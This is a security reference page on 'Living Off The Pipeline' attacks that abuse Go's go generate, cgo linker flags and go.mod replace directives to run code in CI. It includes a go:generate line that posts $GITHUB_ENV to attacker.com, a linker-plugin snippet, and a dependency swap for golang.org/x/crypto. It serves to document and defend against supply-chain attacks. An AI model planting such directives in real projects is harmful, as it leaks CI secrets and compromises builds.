---
layout: tool
title: go
parent: Living Off The Pipeline
nav_order: 3
---

## Living Off The Pipeline - go

The Go toolchain offers multiple, distinct vectors for "Living Off The Pipeline" (LOTP) attacks. An attacker can abuse code generation features, hijack the build process itself, or poison dependencies to achieve Remote Code Execution (RCE) or set up a later exploit.

This analysis covers three separate vectors, all of which use documented features of the Go ecosystem.

### Vector 1: `go generate` (First-Order LOTP Tool)

The `go generate` command is a powerful, built-in tool that executes arbitrary shell commands defined in special `//go:generate` comments within Go source files.

*   **Primitive:** Remote Code Execution (RCE).
*   **Mechanism:** An attacker adds a malicious `//go:generate` directive to a source file in their pull request. A CI pipeline step that runs the common `go generate ./...` command will find and execute the attacker's payload.
*   **Example:**
    ```go
    //go:generate curl --data-binary @$GITHUB_ENV http://attacker.com/
    ```

### Vector 2: `go build` via `cgo` Linker Hijacking (First-Order LOTP Tool)

This is a highly surprising vector that subverts the security assumptions of the `go build` command itself. It uses `cgo`, Go's C language interface, to trick the system linker into executing code *during the build process*.

*   **Primitive:** Remote Code Execution (RCE).
*   **Mechanism:** An attacker adds a Go file with `import "C"` and a malicious `LDFLAGS` directive. This flag instructs the system linker (`ld`) to load a malicious shared object (`.so`) file from the repository as a "plugin." The linker executes code from the plugin as part of its process.
*   **Example:**
    ```go
    package main
    /*
    #cgo LDFLAGS: -Wl,-plugin,./malicious.so
    */
    import "C"
    func main() {}
    ```
    A standard `go build` command will trigger this, as it invokes the linker with the attacker's flags.

### Vector 3: `go.mod` `replace` Directive (Setup Gadget)

The `go.mod` file can be weaponized to act as a "Setup Gadget" that injects one of the other LOTP vectors into the build.

*   **Primitive:** Dependency Confusion / Hijacking.
*   **Mechanism:** The `replace` directive in `go.mod` is meant to substitute a dependency with a local version. An attacker can use it to replace a legitimate dependency with a malicious version located within their pull request. This malicious version can then contain a `go:generate` or `cgo` payload.
*   **Attack Chain:**
    1.  **Setup:** An attacker's PR modifies `go.mod` to `replace` a trusted dependency (e.g., `golang.org/x/crypto`) with a local malicious version.
    2.  **Execution:** The CI pipeline runs a standard `go build`. The Go toolchain compiles the malicious dependency, triggering the embedded `cgo` or `go:generate` payload and achieving RCE.
*   **Example `go.mod`:**
    ```
    replace golang.org/x/crypto => ./internal/malicious-crypto
    ```

### References

*   [Go Generate Documentation](https://go.dev/blog/generate)
*   [Using cgo with the go command](https://go.dev/blog/cgo)
*   [Go Modules: `replace` directive](https://go.dev/ref/mod#go-mod-file-replace)
